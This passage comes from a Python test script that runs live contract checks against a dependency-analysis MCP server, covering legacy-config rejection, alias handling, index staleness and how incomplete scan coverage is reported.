            rejected = await session.call_tool("scan_repository", invalid_arguments)
            check(
                rejected.isError is True
                and "pypi:python:a" in rejected.content[0].text
                and "pypi:python:b" in rejected.content[0].text,
                "Legacy configuration did not provide component migration guidance",
            )
            check(
                named_cache.read_bytes() == named_before,
                "Failed migration changed cache",
            )
            calls.append(
                {
                    "name": "scan_repository",
                    "arguments": invalid_arguments,
                    "result": {"is_error": True, "message": rejected.content[0].text},
                }
            )
            legacy_config.unlink()
            passed.append("legacy-component-scope-rejected-without-cache-mutation")
            handoff = await call(
                "plan_dependency_updates",
                "named-components",
                updates={"pyyaml": "6.0.3"},
                project_id="pypi:python:a",
                target_file="a/pyproject.toml",
                group="project",
            )
            check(
                handoff["handoff"]["status"] == "ready"
                and all(
                    v["status"] == "not-run" for v in handoff["handoff"]["verification"]
                ),
                "Maintenance handoff invented validation",
            )
            passed.append("component-scoped-maintenance-handoff")

            await call("scan_repository", "alias-known")
            known = await call(
                "explain_dependency",
                "alias-known",
                package="lodash",
                ecosystem="npm",
                project_id="npm:npm:.",
            )
            check(
                known["usages"][0]["mapping_confidence"] == "exact",
                "Known alias not exact",
            )
            original_alias = (root / "alias-known" / "package.json").read_text()
            (root / "alias-known" / "package.json").write_text(
                original_alias.replace("lodash/fp", "other")
            )
            check(
                (await call("repository_context", "alias-known"))["stale"],
                "Alias change did not invalidate index",
            )
            await call("index_repository", "alias-known")
            changed_alias = await call(
                "explain_dependency",
                "alias-known",
                package="other",
                ecosystem="npm",
                project_id="npm:npm:.",
            )
            check(
                changed_alias["usages"][0]["reference"] == "#alias",
                "Alias refresh lost usage",
            )
            passed.append("known-alias-and-refresh")
            for fixture in ("dynamic", "alias"):
                partial = await call("scan_repository", fixture)
                check(
                    partial["capabilities"]["dependency_hygiene"]["state"]
                    == "incomplete",
                    f"{fixture} lost its coverage limitation",
                )
                check(
                    not any(
                        f["code"] == "dependency.unused" for f in partial["findings"]
                    ),
                    f"{fixture} asserted an unsupported unused dependency",
                )
                check(
                    not partial["context"]["stale"],
                    "Fresh partial evidence marked stale",
                )
                passed.append(f"{fixture}-usage-incomplete")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output", type=Path, help="Write actual tool calls and results"
    )
    args = parser.parse_args()
    calls: list[dict] = []
    passed: list[str] = []
    result = {
        "kind": "live-mcp-contracts",
        "passed_scenarios": passed,
        "tool_calls": calls,
    }
    try:
        with TemporaryDirectory(prefix="depcheck-skill-") as directory:

            async def bounded():
                async with asyncio.timeout(60):
                    await exercise(Path(directory), calls, passed)

            asyncio.run(bounded())
    finally:
        if args.output:
            args.output.write_text(
                json.dumps(result, indent=2) + "\n", encoding="utf-8"
            )
    print(json.dumps({"passed_scenarios": passed, "tool_call_count": len(calls)}))


if __name__ == "__main__":
    main()
